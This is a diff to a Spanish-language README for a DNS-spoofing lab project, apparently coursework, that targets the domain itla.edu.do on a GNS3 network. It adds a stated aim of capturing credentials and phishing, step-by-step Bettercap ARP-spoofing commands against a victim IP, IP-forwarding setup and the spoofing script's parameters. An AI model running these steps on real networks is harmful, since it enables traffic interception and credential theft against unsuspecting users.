@@ -1,8 +1,12 @@
 # DNS Spoofing Attack - Envenenamiento DNS
 
+## Objetivo del Script
+
+Redirigir las consultas DNS del dominio `itla.edu.do` hacia la IP del atacante (`10.14.89.5`), permitiendo capturar credenciales, servir páginas falsas o realizar ataques de phishing.
+
 ## Descripción
 
-Este proyecto demuestra un ataque de **DNS Spoofing (Envenenamiento DNS)** utilizando Python y Scapy. El ataque redirige las consultas DNS de un dominio específico hacia una IP controlada por el atacante, permitiendo ataques de tipo Man-in-the-Middle (MITM).
+Este proyecto demuestra un ataque de **DNS Spoofing (Envenenamiento DNS)** utilizando Python y Scapy, combinado con **Bettercap** para el posicionamiento MITM. El ataque redirige las consultas DNS de un dominio específico hacia una IP controlada por el atacante.
 
 ## Topología de Red
 
@@ -19,24 +23,76 @@ Este proyecto demuestra un ataque de **DNS Spoofing (Envenenamiento DNS)** utili
 
 - **Segmento de Red:** 10.14.89.0/26 (Rango útil: .1 a .62)
 - **Interfaz del atacante:** `ens3`
+- **VLAN:** Nativa (VLAN 1)
 
-## Pre-requisitos
+## Capturas de Pantalla
 
-Para que este ataque funcione, primero se debe realizar un **ARP Spoofing** para posicionarse como Man-in-the-Middle entre la víctima y el gateway. Esto se logró con Bettercap:
+> Las capturas demuestran la ejecución exitosa del ataque en el laboratorio.
 
-```bash
-# En Bettercap
-set arp.spoof.targets 10.14.89.4
-set arp.spoof.fullduplex true
-arp.spoof on
-```
+| Captura | Descripción |
+|---------|-------------|
+| ![Topología](Topologia_GNS3.png) | Topología de red en GNS3 |
+
+## Parámetros del Script
+
+| Parámetro | Valor | Descripción |
+|-----------|-------|-------------|
+| `interfaz` | `ens3` | Interfaz de red del atacante |
+| `dominio_objetivo` | `itla.edu.do.` | Dominio a interceptar (con punto final) |
+| `ip_falsa` | `10.14.89.5` | IP a la que se redirige el tráfico |
+| `filter` | `udp port 53` | Filtro para capturar solo tráfico DNS |
 
 ## Requisitos
 
+### Software
 - Python 3.x
 - Scapy (`pip install scapy`)
+- **Bettercap** (para ARP Spoofing)
 - Permisos de superusuario (root)
+
+### Red
 - Posicionamiento MITM previo (ARP Spoofing)
+- Estar en el mismo segmento de red que la víctima
+
+## Pre-requisito: ARP Spoofing con Bettercap
+
+Para que el DNS Spoofing funcione, primero se debe realizar **ARP Spoofing** para posicionarse como Man-in-the-Middle entre la víctima y el gateway.
+
+### Instalación de Bettercap
+```bash
+sudo apt update
+sudo apt install bettercap
+```
+
+### Ejecución de Bettercap
+```bash
+sudo bettercap -iface ens3
+```
+
+### Comandos en Bettercap
+```bash
+# Ver dispositivos en la red
+net.probe on
+net.show
+
+# Configurar el objetivo (IP de la víctima)
+set arp.spoof.targets 10.14.89.4
+
+# Habilitar ARP Spoofing bidireccional (full duplex)
+set arp.spoof.fullduplex true
+
+# Iniciar el ataque ARP Spoofing
+arp.spoof on
+
+# Verificar que el spoofing está activo
+arp.spoof.show
+```
+
+### Habilitar IP Forwarding
+```bash
+# Para que el tráfico fluya a través del atacante
+sudo sysctl -w net.ipv4.ip_forward=1
+```
 
 ## Instalación
 
